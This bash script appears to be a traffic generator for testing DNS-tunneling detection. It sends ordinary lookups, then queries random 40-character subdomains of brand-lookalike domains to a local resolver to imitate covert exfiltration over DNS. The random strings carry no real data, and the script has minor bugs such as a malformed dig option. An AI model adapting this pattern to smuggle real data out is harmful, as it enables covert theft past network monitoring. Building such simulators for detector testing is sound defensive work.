#!/bin/bash

echo "[*] Start sending clean domains (Benign Traffic)..."
# Clean domains
clean_domains="www.google.com www.vnexpress.net mail.yahoo.com chat.openai.com github.com"

for domain in $clean_domains; do
    echo " -> Asking $domain"
    dig +short +time=1 tries=1 $domain 192.168.50.1 > /dev/null
    sleep 1
done

echo "[*] Start sending sophisticated DNS Tunneling Payloads (Base64 Mode)..."

# 15 malware domains
fake_roots=(
    "api-telemetry.com"
    "cdn-static-assets.net"
    "windows-update-v2.com"
    "aws-metrics-server.org"
    "azure-edge-global.net"
    "cloud-sync-service.com"
    "apple-health-sync.net"
    "google-analytics-v4.org"
    "playstation-network-api.com"
    "github-user-content.net"
    "zoom-video-telemetry.us"
    "slack-messaging-api.com"
    "cloudflare-dns-routing.net"
    "office365-auth-token.com"
    "spotify-streaming-cdn.net"
    "malware.com"
)

for i in 1 2 3 4 5; do
    # 1.  Random Subdomain (Payload)
    random_sub=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 40 | head -n 1)
    
    # 2. Choose randomly 1 Root Domain from  fake_roots
    random_root=${fake_roots[$RANDOM % ${#fake_roots[@]}]}
    
    # 3. Merge
    malicious_domain="${random_sub}.${random_root}"
    echo " -> Asking $malicious_domain"
    
    # 4. Send
    dig +short +timeout=1 +retry=1 "$malicious_domain" 192.168.50.1 > /dev/null
    sleep 1
done

echo "[*] DONE!"
